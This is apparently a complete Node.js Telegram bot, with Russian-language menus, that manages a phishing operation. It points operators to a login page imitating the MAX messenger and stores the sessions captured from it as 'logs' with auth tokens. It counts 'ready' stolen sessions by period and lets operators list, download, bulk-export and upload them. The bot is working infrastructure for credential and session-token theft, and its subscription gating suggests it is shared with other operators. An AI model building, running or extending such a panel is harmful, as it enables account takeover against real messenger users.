const fs = require('fs');
const path = require('path');
const { SESSION_NAME } = require('../server/bridge');
const config = require('./config');
const { filterOnlyNew, markExported } = require('./export-state');
const { getUserSettings, setUserSettings, clearExportHistory } = require('./user-settings');

const PERIOD_MS = {
  day: 24 * 60 * 60 * 1000,
  week: 7 * 24 * 60 * 60 * 1000,
  month: 30 * 24 * 60 * 60 * 1000
};

const PERIOD_LABEL = {
  day: 'за день',
  week: 'за неделю',
  month: 'за месяц',
  all: 'за всё время'
};

const TOKEN = config.token;
const ADMINS = config.admins;
const REQUIRED_CHATS = config.requiredChats;
const SUBSCRIPTION_ENABLED = config.subscriptionEnabled;
const ADMIN_ONLY = config.adminOnly;
const SUPPORT = config.supportUsername.replace(/^@/, '');
const LINKS = config.links;
const AUTH_SITE = config.authSiteUrl;
const SESSIONS_DIR = path.join(process.cwd(), 'sessions');
const LOCK_FILE = path.join(process.cwd(), '.bot.lock');
const API = TOKEN ? `https://api.telegram.org/bot${TOKEN}` : '';

const NAV = {
  MENU: 'menu',
  PROFILE: 'profile',
  BOTS: 'bots',
  TEMPLATES: 'templates',
  TEMPLATE_MAX: 'template_max',
  LINKS: 'links',
  SETTINGS: 'settings'
};

const ACTION = {
  LIST: 'list',
  DOWNLOAD: 'download',
  EXPORT: 'export',
  UPLOAD: 'upload',
  STATS: 'stats'
};

const pendingUpload = new Set();

let offset = 0;
let running = true;

function ensureSessionsDir() {
  fs.mkdirSync(SESSIONS_DIR, { recursive: true });
}

function isAdmin(userId) {
  return ADMINS.has(String(userId));
}

function configuredChats() {
  return REQUIRED_CHATS.filter((chat) => chat.chatId);
}

function sessionBasename(name) {
  const base = path.basename(String(name || '').trim());
  if (!base || base.includes('..') || !base.endsWith('.json')) {
    throw new Error('Укажите имя файла, например: pult.json');
  }
  return base;
}

function listSessionFiles() {
  ensureSessionsDir();
  return fs
    .readdirSync(SESSIONS_DIR)
    .filter((name) => name.endsWith('.json'))
    .map((name) => {
      const full = path.join(SESSIONS_DIR, name);
      const stat = fs.statSync(full);
      let hasToken = false;
      try {
        const data = JSON.parse(fs.readFileSync(full, 'utf8'));
        hasToken = Boolean(data && data.token);
      } catch {
        hasToken = false;
      }
      return {
        name,
        size: stat.size,
        mtime: stat.mtime,
        hasToken
      };
    })
    .sort((a, b) => b.mtime.getTime() - a.mtime.getTime());
}

function formatBytes(size) {
  if (size < 1024) return `${size} B`;
  if (size < 1024 * 1024) return `${(size / 1024).toFixed(1)} KB`;
  return `${(size / (1024 * 1024)).toFixed(1)} MB`;
}

function filterByPeriod(files, period) {
  if (period === 'all') return files;
  const ms = PERIOD_MS[period];
  if (!ms) return files;
  const since = Date.now() - ms;
  return files.filter((file) => file.mtime.getTime() >= since);
}

function sessionStats(period) {
  const files = filterByPeriod(listSessionFiles(), period);
  const valid = files.filter((file) => file.hasToken);
  return {
    total: files.length,
    valid: valid.length,
    files
  };
}

function formatStatsSummary() {
  const day = sessionStats('day');
  const week = sessionStats('week');
  const month = sessionStats('month');
  const all = sessionStats('all');

  return [
    '📊 Статистика логов',
    '',
    `Сегодня: ${day.valid} готовых / ${day.total} всего`,
    `Неделя: ${week.valid} готовых / ${week.total} всего`,
    `Месяц: ${month.valid} готовых / ${month.total} всего`,
    `Всего: ${all.valid} готовых / ${all.total} всего`,
    '',
    'Готовые — сессии с токеном после успешного входа.'
  ].join('\n');
}

function formatStatsPeriod(period) {
  const stats = sessionStats(period);
  const label = PERIOD_LABEL[period] || period;
  if (!stats.files.length) {
    return `За период ${label} логов пока нет.`;
  }

  const lines = stats.files.slice(0, 15).map((file) => {
    const mark = file.hasToken ? '✅' : '⏳';
    const date = file.mtime.toISOString().replace('T', ' ').slice(0, 16);
    return `${mark} ${file.name} — ${formatBytes(file.size)}, ${date}`;
  });

  const more = stats.files.length > 15 ? `\n…и ещё ${stats.files.length - 15}` : '';
  return [
    `📊 Логи ${label}`,
    '',
    `Готовых: ${stats.valid} · Всего: ${stats.total}`,
    '',
    ...lines,
    more
  ]
    .filter(Boolean)
    .join('\n');
}

function formatList(files) {
  if (!files.length) {
    return 'В папке sessions/ пока нет .json файлов.';
  }
  const lines = files.map((file) => {
    const tokenMark = file.hasToken ? 'token: да' : 'token: нет';
    const date = file.mtime.toISOString().replace('T', ' ').slice(0, 19);
    return `• ${file.name} — ${formatBytes(file.size)}, ${tokenMark}, ${date}`;
  });
  return ['Файлы сессий:', '', ...lines].join('\n');
}

function backButton() {
  return [{ text: '◀️ В меню', callback_data: `nav:${NAV.MENU}` }];
}

function mainMenuInlineKeyboard() {
  return {
    inline_keyboard: [
      [{ text: '👨‍💻 Профиль', callback_data: `nav:${NAV.PROFILE}` }],
      [
        { text: '🔵 Боты', callback_data: `nav:${NAV.BOTS}` },
        { text: '📄 Шаблоны', callback_data: `nav:${NAV.TEMPLATES}` }
      ],
      [
        { text: '🔗 Ссылки', callback_data: `nav:${NAV.LINKS}` },
        { text: '⚙️ Настройки', callback_data: `nav:${NAV.SETTINGS}` }
      ],
      [{ text: '» Поддержка', url: LINKS.support.url }]
    ]
  };
}

function profileKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '📅 День', callback_data: 'stats:day' },
        { text: '📅 Неделя', callback_data: 'stats:week' },
        { text: '📅 Месяц', callback_data: 'stats:month' }
      ],
      [
        { text: '📋 Список', callback_data: `act:${ACTION.LIST}` },
        { text: '📥 Скачать', callback_data: `act:${ACTION.DOWNLOAD}` }
      ],
      [
        { text: '📤 Выгрузка', callback_data: `act:${ACTION.EXPORT}` },
        { text: '📤 Загрузить', callback_data: `act:${ACTION.UPLOAD}` }
      ],
      backButton()
    ]
  };
}

function linksKeyboard() {
  return {
    inline_keyboard: [
      [{ text: LINKS.chat.label, url: LINKS.chat.url }],
      [{ text: LINKS.channel.label, url: LINKS.channel.url }],
      [{ text: LINKS.support.label, url: LINKS.support.url }],
      backButton()
    ]
  };
}

function templatesKeyboard() {
  return {
    inline_keyboard: [
      [{ text: 'MAX', callback_data: `nav:${NAV.TEMPLATE_MAX}` }],
      backButton()
    ]
  };
}

function settingsKeyboard(userId) {
  const settings = getUserSettings(userId);
  const notifyLabel = settings.notify ? '🔔 Уведомления: вкл' : '🔕 Уведомления: выкл';
  const langLabel = settings.lang === 'en' ? '🌐 Язык: English' : '🌐 Язык: Русский';

  return {
    inline_keyboard: [
      [{ text: notifyLabel, callback_data: 'set:notify' }],
      [{ text: langLabel, callback_data: 'set:lang' }],
      [{ text: '🔗 Сайт авторизации', url: AUTH_SITE }],
      [{ text: '🗑 Сбросить историю выгрузок', callback_data: 'set:reset_export' }],
      backButton()
    ]
  };
}

function subscribeKeyboard() {
  const rows = REQUIRED_CHATS.map((chat) => [{ text: chat.label, url: chat.url }]);
  rows.push([{ text: '✅ Проверить подписку', callback_data: 'check_sub' }]);
  return { inline_keyboard: rows };
}

function downloadKeyboard(files) {
  const rows = files.slice(0, 20).map((file, index) => [
    { text: file.name, callback_data: `dl:${index}` }
  ]);
  rows.push(backButton());
  return { inline_keyboard: rows };
}

function exportKeyboard() {
  return {
    inline_keyboard: [
      [
        { text: '📅 День', callback_data: 'exp:day' },
        { text: '📅 Неделя', callback_data: 'exp:week' }
      ],
      [
        { text: '📅 Месяц', callback_data: 'exp:month' },
        { text: '📦 Все', callback_data: 'exp:all' }
      ],
      [
        { text: '✨ Новые · день', callback_data: 'exp:new:day' },
        { text: '✨ Новые · неделя', callback_data: 'exp:new:week' }
      ],
      [
        { text: '✨ Новые · месяц', callback_data: 'exp:new:month' },
        { text: '✨ Все новые', callback_data: 'exp:new:all' }
      ],
      [{ text: '◀️ В профиль', callback_data: `nav:${NAV.PROFILE}` }]
    ]
  };
}

function collectExportFiles(userId, period, onlyNew) {
  let files = filterByPeriod(listSessionFiles(), period);
  if (onlyNew) files = filterOnlyNew(userId, files);
  return files;
}

async function runExport(chatId, userId, period, onlyNew) {
  const files = collectExportFiles(userId, period, onlyNew);

  if (!files.length) {
    const mode = onlyNew ? 'новых' : '';
    await sendMessage(
      chatId,
      `Нет ${mode} сессий ${PERIOD_LABEL[period] || 'по фильтру'}.`,
      { reply_markup: profileKeyboard() }
    );
    return;
  }

  for (const file of files) {
    await sendDocument(chatId, path.join(SESSIONS_DIR, file.name), `sessions/${file.name}`);
  }
  markExported(userId, files);

  const modeLabel = onlyNew ? 'только новые' : 'все';
  await sendMessage(
    chatId,
    `Выгружено: ${files.length} файл(ов)\nРежим: ${modeLabel}, ${PERIOD_LABEL[period]}.`,
    { reply_markup: profileKeyboard() }
  );
}

function isMemberStatus(member) {
  const status = member.status;
  if (['creator', 'administrator', 'member'].includes(status)) return true;
  if (status === 'restricted' && member.is_member) return true;
  return false;
}

async function api(method, body, options = {}) {
  const url = `${API}/${method}`;
  const init = { method: 'POST' };

  if (options.multipart) {
    init.body = body;
  } else {
    init.headers = { 'Content-Type': 'application/json' };
    init.body = JSON.stringify(body);
  }

  const response = await fetch(url, init);
  const data = await response.json();
  if (!data.ok) {
    throw new Error(data.description || `Telegram API error (${method})`);
  }
  return data.result;
}

async function sendMessage(chatId, text, extra = {}) {
  return api('sendMessage', { chat_id: chatId, text, ...extra });
}

async function editMessage(chatId, messageId, text, extra = {}) {
  return api('editMessageText', {
    chat_id: chatId,
    message_id: messageId,
    text,
    ...extra
  });
}

async function answerCallback(callbackQueryId, text = '') {
  return api('answerCallbackQuery', {
    callback_query_id: callbackQueryId,
    text,
    show_alert: Boolean(text)
  });
}

async function sendDocument(chatId, filePath, caption = '') {
  const form = new FormData();
  form.append('chat_id', String(chatId));
  form.append('document', new Blob([fs.readFileSync(filePath)]), path.basename(filePath));
  if (caption) form.append('caption', caption);
  return api('sendDocument', form, { multipart: true });
}

async function downloadTelegramFile(fileId, targetPath) {
  const file = await api('getFile', { file_id: fileId });
  const url = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error('Не удалось скачать файл из Telegram.');
  }
  const buffer = Buffer.from(await response.arrayBuffer());
  fs.writeFileSync(targetPath, buffer);
}

async function checkSubscription(userId) {
  if (isAdmin(userId)) return { ok: true, missing: [] };

  const chats = configuredChats();
  if (!chats.length) {
    return { ok: false, missing: REQUIRED_CHATS, notConfigured: true };
  }

  const missing = [];
  for (const chat of chats) {
    try {
      const member = await api('getChatMember', {
        chat_id: chat.chatId,
        user_id: userId
      });
      if (!isMemberStatus(member)) missing.push(chat);
    } catch (error) {
      console.error(`sub check ${chat.label}:`, error.message);
      missing.push(chat);
    }
  }
  return { ok: missing.length === 0, missing };
}

function subscribeText(missing) {
  const names = (missing.length ? missing : REQUIRED_CHATS).map((chat) => `• ${chat.label}`).join('\n');
  return [
    'Для доступа к боту подпишитесь на ресурсы:',
    '',
    names,
    '',
    'После подписки нажмите «Проверить подписку».'
  ].join('\n');
}

async function requireSubscription(chatId, userId) {
  if (!SUBSCRIPTION_ENABLED) return true;
  const result = await checkSubscription(userId);
  if (result.ok) return true;
  let text = subscribeText(result.missing);
  if (result.notConfigured) {
    text += '\n\nАдмин: добавьте бота в чаты, выполните /chatid и впишите id в .env.';
  }
  await sendMessage(chatId, text, {
    reply_markup: subscribeKeyboard()
  });
  return false;
}

async function removeReplyKeyboard(chatId) {
  await sendMessage(chatId, '·', { reply_markup: { remove_keyboard: true } });
}

async function showMainMenu(chatId, text = 'Главное меню:', options = {}) {
  const markup = { reply_markup: mainMenuInlineKeyboard() };
  if (options.messageId) {
    await editMessage(chatId, options.messageId, text, markup);
    return;
  }
  await sendMessage(chatId, text, markup);
}

async function showProfile(chatId, messageId) {
  const text = [
    '👨‍💻 Профиль',
    '',
    formatStatsSummary(),
    '',
    'Здесь же — список, скачивание и выгрузка сессий.'
  ].join('\n');
  const markup = { reply_markup: profileKeyboard() };
  if (messageId) {
    await editMessage(chatId, messageId, text, markup);
  } else {
    await sendMessage(chatId, text, markup);
  }
}

async function showBots(chatId, messageId) {
  const text = [
    '🔵 Боты',
    '',
    'Раздел в разработке — позже доделаю.',
    '',
    'Скоро здесь можно будет управлять своими ботами.'
  ].join('\n');
  const markup = { reply_markup: { inline_keyboard: [backButton()] } };
  if (messageId) {
    await editMessage(chatId, messageId, text, markup);
  } else {
    await sendMessage(chatId, text, markup);
  }
}

async function showTemplates(chatId, messageId) {
  const text = ['📄 Шаблоны', '', 'Доступные шаблоны авторизации:'].join('\n');
  const markup = { reply_markup: templatesKeyboard() };
  if (messageId) {
    await editMessage(chatId, messageId, text, markup);
  } else {
    await sendMessage(chatId, text, markup);
  }
}

async function showTemplateMax(chatId, messageId) {
  const text = [
    '📄 Шаблон MAX',
    '',
    'Страница входа в стиле оригинального MAX:',
    'QR, телефон, SMS и выбор страны.',
    '',
    `Сайт: ${AUTH_SITE}`,
    '',
    `После входа сессия сохраняется и доступна в профиле бота @${config.botUsername}.`
  ].join('\n');
  const markup = {
    inline_keyboard: [
      [{ text: '🌐 Открыть сайт', url: AUTH_SITE }],
      [{ text: '◀️ К шаблонам', callback_data: `nav:${NAV.TEMPLATES}` }],
      backButton()
    ]
  };
  if (messageId) {
    await editMessage(chatId, messageId, text, markup);
  } else {
    await sendMessage(chatId, text, markup);
  }
}

async function showLinks(chatId, messageId) {
  const text = ['🔗 Ссылки', '', 'Наши ресурсы:'].join('\n');
  const markup = { reply_markup: linksKeyboard() };
  if (messageId) {
    await editMessage(chatId, messageId, text, markup);
  } else {
    await sendMessage(chatId, text, markup);
  }
}

async function showSettings(chatId, userId, messageId) {
  const settings = getUserSettings(userId);
  const text = [
    '⚙️ Настройки',
    '',
    `Уведомления: ${settings.notify ? 'включены' : 'выключены'}`,
    `Язык интерфейса: ${settings.lang === 'en' ? 'English' : 'Русский'}`,
    '',
    'Сайт авторизации открывается по кнопке ниже.',
    `Активная сессия пульта: ${SESSION_NAME}.json`
  ].join('\n');
  const markup = { reply_markup: settingsKeyboard(userId) };
  if (messageId) {
    await editMessage(chatId, messageId, text, markup);
  } else {
    await sendMessage(chatId, text, markup);
  }
}

async function requireAdmin(chatId, userId) {
  if (!ADMIN_ONLY || isAdmin(userId)) return true;
  await sendMessage(chatId, `Нет доступа.\nПоддержка: @${SUPPORT}`);
  return false;
}

async function sendSessionFile(chatId, name) {
  const full = path.join(SESSIONS_DIR, sessionBasename(name));
  if (!fs.existsSync(full)) {
    throw new Error(`Файл sessions/${path.basename(name)} не найден.`);
  }
  await sendDocument(chatId, full, `sessions/${path.basename(name)}`);
}

async function handleDocument(chatId, document) {
  const name = sessionBasename(document.file_name || '');
  const target = path.join(SESSIONS_DIR, name);
  await downloadTelegramFile(document.file_id, target);

  try {
    const data = JSON.parse(fs.readFileSync(target, 'utf8'));
    if (!data || typeof data !== 'object') {
      throw new Error('JSON должен быть объектом.');
    }
  } catch (error) {
    fs.unlinkSync(target);
    throw new Error(`Файл не похож на сессию: ${error.message}`);
  }

  pendingUpload.delete(chatId);
  await sendMessage(chatId, `Сохранено: sessions/${name}`, {
    reply_markup: profileKeyboard()
  });
}

async function handleNavigation(chatId, userId, nav, messageId) {
  if (nav === NAV.MENU) {
    await showMainMenu(chatId, 'Главное меню:', { messageId });
    return;
  }
  if (nav === NAV.PROFILE) {
    await showProfile(chatId, messageId);
    return;
  }
  if (nav === NAV.BOTS) {
    await showBots(chatId, messageId);
    return;
  }
  if (nav === NAV.TEMPLATES) {
    await showTemplates(chatId, messageId);
    return;
  }
  if (nav === NAV.TEMPLATE_MAX) {
    await showTemplateMax(chatId, messageId);
    return;
  }
  if (nav === NAV.LINKS) {
    await showLinks(chatId, messageId);
    return;
  }
  if (nav === NAV.SETTINGS) {
    await showSettings(chatId, userId, messageId);
    return;
  }
}

async function handleAction(chatId, action, messageId) {
  if (action === ACTION.LIST) {
    const text = formatList(listSessionFiles());
    const markup = { reply_markup: profileKeyboard() };
    if (messageId) {
      await editMessage(chatId, messageId, text, markup);
    } else {
      await sendMessage(chatId, text, markup);
    }
    return;
  }

  if (action === ACTION.DOWNLOAD) {
    const files = listSessionFiles();
    if (!files.length) {
      const text = 'Нет файлов для скачивания.';
      const markup = { reply_markup: profileKeyboard() };
      if (messageId) {
        await editMessage(chatId, messageId, text, markup);
      } else {
        await sendMessage(chatId, text, markup);
      }
      return;
    }
    const text = 'Выберите файл:';
    const markup = { reply_markup: downloadKeyboard(files) };
    if (messageId) {
      await editMessage(chatId, messageId, text, markup);
    } else {
      await sendMessage(chatId, text, markup);
    }
    return;
  }

  if (action === ACTION.EXPORT) {
    const text = [
      'Выгрузка сессий:',
      '',
      'Период — файлы по дате изменения.',
      '«Только новые» — те, что ещё не выгружали.'
    ].join('\n');
    const markup = { reply_markup: exportKeyboard() };
    if (messageId) {
      await editMessage(chatId, messageId, text, markup);
    } else {
      await sendMessage(chatId, text, markup);
    }
    return;
  }

  if (action === ACTION.UPLOAD) {
    pendingUpload.add(chatId);
    const text = 'Пришлите .json файл сессии документом.';
    const markup = { reply_markup: profileKeyboard() };
    if (messageId) {
      await editMessage(chatId, messageId, text, markup);
    } else {
      await sendMessage(chatId, text, markup);
    }
  }
}

async function handleText(chatId, userId, text) {
  const trimmed = String(text || '').trim();

  if (trimmed === '/start') {
    if (!(await requireSubscription(chatId, userId))) return;
    if (!(await requireAdmin(chatId, userId))) return;
    await removeReplyKeyboard(chatId);
    await showMainMenu(chatId, `Привет! @${config.botUsername}\n\nГлавное меню:`);
    return;
  }

  if (trimmed === '/help' || trimmed === '/menu') {
    if (!(await requireSubscription(chatId, userId))) return;
    if (!(await requireAdmin(chatId, userId))) return;
    await showMainMenu(chatId);
    return;
  }

  if (trimmed === '/chatid' && isAdmin(userId) && String(chatId).startsWith('-')) {
    await sendMessage(chatId, `chat_id этого чата: ${chatId}`);
    return;
  }

  if (trimmed.startsWith('/get')) {
    if (!(await requireSubscription(chatId, userId))) return;
    if (!(await requireAdmin(chatId, userId))) return;
    const name = trimmed.split(/\s+/)[1] || `${SESSION_NAME}.json`;
    await sendSessionFile(chatId, name);
    return;
  }

  if (pendingUpload.has(chatId)) {
    await sendMessage(chatId, 'Жду .json документ, не текст.');
  }
}

async function handleCallback(callback) {
  const chatId = callback.message.chat.id;
  const userId = callback.from.id;
  const data = callback.data || '';

  try {
    if (data === 'check_sub' && SUBSCRIPTION_ENABLED) {
      const result = await checkSubscription(userId);
      if (!result.ok) {
        const alert = result.notConfigured
          ? 'Проверка не настроена. Админ: укажите chat id в .env'
          : 'Подписка не найдена. Вступите в чаты и попробуйте снова.';
        await answerCallback(callback.id, alert);
        let text = subscribeText(result.missing);
        if (result.notConfigured) {
          text += '\n\nАдмин: добавьте бота в чаты, выполните /chatid и впишите id в .env.';
        }
        await editMessage(chatId, callback.message.message_id, text, {
          reply_markup: subscribeKeyboard()
        });
        return;
      }

      await answerCallback(callback.id, 'Подписка подтверждена');
      if (!(await requireAdmin(chatId, userId))) return;
      await showMainMenu(chatId, 'Подписка подтверждена. Главное меню:', {
        messageId: callback.message.message_id
      });
      return;
    }

    if (data.startsWith('nav:')) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdmin(chatId, userId))) return;
      await answerCallback(callback.id);
      await handleNavigation(chatId, userId, data.slice(4), callback.message.message_id);
      return;
    }

    if (data.startsWith('stats:')) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdmin(chatId, userId))) return;
      const period = data.slice(6);
      if (!PERIOD_LABEL[period]) {
        await answerCallback(callback.id, 'Неизвестный период');
        return;
      }
      await answerCallback(callback.id);
      const text = formatStatsPeriod(period);
      await editMessage(chatId, callback.message.message_id, text, {
        reply_markup: profileKeyboard()
      });
      return;
    }

    if (data.startsWith('set:')) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdmin(chatId, userId))) return;
      const setting = data.slice(4);
      if (setting === 'notify') {
        const current = getUserSettings(userId);
        setUserSettings(userId, { notify: !current.notify });
        await answerCallback(callback.id, 'Сохранено');
        await showSettings(chatId, userId, callback.message.message_id);
        return;
      }
      if (setting === 'lang') {
        const current = getUserSettings(userId);
        setUserSettings(userId, { lang: current.lang === 'ru' ? 'en' : 'ru' });
        await answerCallback(callback.id, 'Сохранено');
        await showSettings(chatId, userId, callback.message.message_id);
        return;
      }
      if (setting === 'reset_export') {
        clearExportHistory(userId);
        await answerCallback(callback.id, 'История выгрузок сброшена');
        await showSettings(chatId, userId, callback.message.message_id);
        return;
      }
      await answerCallback(callback.id);
      return;
    }

    if (data.startsWith('act:')) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdmin(chatId, userId))) return;
      await answerCallback(callback.id);
      await handleAction(chatId, data.slice(4), callback.message.message_id);
      return;
    }

    if (data.startsWith('exp:')) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdmin(chatId, userId))) return;
      const parts = data.split(':');
      const onlyNew = parts[1] === 'new';
      const period = onlyNew ? parts[2] : parts[1];
      if (!PERIOD_LABEL[period]) {
        await answerCallback(callback.id, 'Неизвестный период');
        return;
      }
      await answerCallback(callback.id, 'Выгружаю...');
      await runExport(chatId, userId, period, onlyNew);
      return;
    }

    if (data.startsWith('dl:')) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdmin(chatId, userId))) return;
      const index = Number(data.slice(3));
      const files = listSessionFiles();
      const file = files[index];
      if (!file) {
        await answerCallback(callback.id, 'Файл не найден');
        return;
      }
      await answerCallback(callback.id);
      await sendSessionFile(chatId, file.name);
      return;
    }

    await answerCallback(callback.id);
  } catch (error) {
    await answerCallback(callback.id, error.message || String(error));
  }
}

async function handleUpdate(update) {
  if (update.callback_query) {
    await handleCallback(update.callback_query);
    return;
  }

  const message = update.message;
  if (!message || !message.from) return;

  const chatId = message.chat.id;
  const userId = message.from.id;

  try {
    if (message.document) {
      if (!(await requireSubscription(chatId, userId))) return;
      if (!(await requireAdmin(chatId, userId))) return;
      await handleDocument(chatId, message.document);
      return;
    }
    if (message.text) {
      await handleText(chatId, userId, message.text);
    }
  } catch (error) {
    await sendMessage(chatId, `Ошибка: ${error.message || String(error)}`);
  }
}

async function poll() {
  while (running) {
    try {
      const updates = await api('getUpdates', {
        offset,
        timeout: 50,
        allowed_updates: ['message', 'callback_query']
      });

      for (const update of updates) {
        offset = update.update_id + 1;
        await handleUpdate(update);
      }
    } catch (error) {
      console.error('poll:', error.message || error);
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }
  }
}

function validateEnv() {
  if (!TOKEN) {
    console.error('Нужен TELEGRAM_BOT_TOKEN в .env');
    process.exit(1);
  }
  if (!ADMINS.size) {
    console.error('Нужен TELEGRAM_ADMIN_IDS в .env');
    process.exit(1);
  }
  if (SUBSCRIPTION_ENABLED && !configuredChats().length) {
    console.warn('Подписка включена, но chat id не заданы в .env');
  }
}

function isProcessRunning(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function acquireLock() {
  if (fs.existsSync(LOCK_FILE)) {
    const oldPid = Number(fs.readFileSync(LOCK_FILE, 'utf8').trim());
    if (oldPid && oldPid !== process.pid && isProcessRunning(oldPid)) {
      console.error(`Бот уже запущен (pid ${oldPid}). Остановите его перед новым запуском.`);
      process.exit(1);
    }
  }
  fs.writeFileSync(LOCK_FILE, String(process.pid), 'utf8');
}

function releaseLock() {
  try {
    if (!fs.existsSync(LOCK_FILE)) return;
    const owner = Number(fs.readFileSync(LOCK_FILE, 'utf8').trim());
    if (owner === process.pid) fs.unlinkSync(LOCK_FILE);
  } catch {
    /* ignore */
  }
}

function shutdown() {
  running = false;
  releaseLock();
}

async function bootstrap() {
  validateEnv();
  acquireLock();
  ensureSessionsDir();
  try {
    await api('deleteWebhook', { drop_pending_updates: true });
  } catch (error) {
    console.warn('deleteWebhook:', error.message || error);
  }
  console.log(
    `@${config.botUsername}: admins=${ADMINS.size}, subscription=${SUBSCRIPTION_ENABLED ? 'on' : 'off'}, adminOnly=${ADMIN_ONLY ? 'on' : 'off'}`
  );
  await poll();
}

bootstrap().catch((error) => {
  console.error(error);
  process.exit(1);
});

process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
process.on('exit', releaseLock);
